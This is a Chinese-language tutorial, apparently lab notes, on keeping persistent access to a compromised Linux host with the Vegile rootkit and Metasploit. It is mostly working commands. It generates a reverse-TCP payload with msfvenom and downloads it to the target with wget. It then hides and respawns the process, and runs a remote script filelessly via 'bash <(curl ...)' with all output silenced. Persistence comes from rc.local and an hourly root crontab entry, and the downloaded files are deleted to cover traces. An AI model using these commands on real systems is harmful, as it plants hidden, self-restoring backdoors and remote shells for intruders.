# Vegile是用于linux系统渗透测试中的权限维持
Vegile这个工具将设置一个后门/rootkit，
并且这个后门会直接隐藏进程，无限连接metesploit,持续维持你的Metepreter会话
即使木马进程被杀死，它依然会再次重新运行，换句话说是该进程无限循环的。  

`git clone https://github.com/Screetsec/Vegile.git`

## 生成木马
```
sudo msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00"  -f elf -o /var/www/html/xiao4
```
## 监听
```
msfconsole
use exploit/multi/handler
set payload linux/x64/shell/reverse_tcp
set LHOST 192.168.100.143
set LPORT 4444
options  
run
```
## 靶机
```
ssh 192.168.100.132
wget 192.168.100.143/xiao4 
chmod +x ./xiao4
```

```sh
ls
/usr/sbin/ifconfig
wget 192.168.100.143/vegile.zip
unzip vegile.zip
cd Vegile-master
chmod +x Vegile
wget 192.168.1.53/xiao4
chmod +x xiao4
./Vegile --i xiao4
./Vegile --u xiao4 无限复制你的metasploit会话，即使他被kill，依然可以再次运行
```

```
rm -rf /root/Vegile-master
```

## 使用脚本来进行自动创建后门
```sh
xiaoxiaoran.sh
#!/bin/bash
cd /tmp/ #切换工作目录
#把前面下载Vegile到执行后门文件的命令使用&&拼接成一条命令#&&表示前面的命令执行成功则执行下一条命令
# echo y | 表示将y作为Vegile命令的输入，因为执行Vegile命令是需要我们按任意键退出，所以我们手动输入一个字符让程序执行完成后自动退出。
#>> /dev/null 2>&1 不显示所有输出结果。
wget 192.168.100.143/vegile.zip && unzip Vegile-master.zip && cd Vegile-master && chmod +x Vegile && wget 192.168.100.143/xiao4 && chmod +x xiao4 && echo y  |  ./Vegile --i xiao4 >> /dev/null 2>&1
#删除下载的所有文件
rm -rf /tmp/vegile.zip  /tmp/Vegile-master
ssh 192.168.100.132
bash <(curl -s -L http://192.168.100.143/xiaoxiaoran.sh) >> /dev/null 2>&1
	bash <() #表示将括号中的内容通过bash来执行
	curl -s -L #curl是一个利用URL语法在命令行下进行文件传输的工具
	-s --silent #表示静默模式不输出任何内容
	-L  跟http连接，组合使用的效果是把http连接中的文件下载到内存中，然后传bash，进行执行。这样好处是：本地不会保存任何文件。
	>> /dev/null 2>&1 #不输出任何信息
```

## 配置开机启动
```
echo "bash <(curl -s -L http://192.168.100.143/xiaoxiaoran.sh) >> /dev/null 2>&1" >> /etc/rc.d/rc.local
chmod +x /etc/rc.d/rc.local  #部分centos操作系统rc.local文件没有执行权限需要手动添加
```
## 配置计划任务
```sh
vim /etc/crontab   #这个是系统任务调度的配置文件

SHELL=/bin/bash    #指定操作系统使用哪个shell
PATH=/sbin:/bin:/usr/sbin:/usr/bin     #系统执行命令的搜索路径
MAILTO=root   #将执行任务的信息通过邮件发送给xx用户

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
0 */1 * * * root bash <(curl -s -L http://192.168.1.53/xiaoxiaoran.sh) >> /dev/null 2>&1

```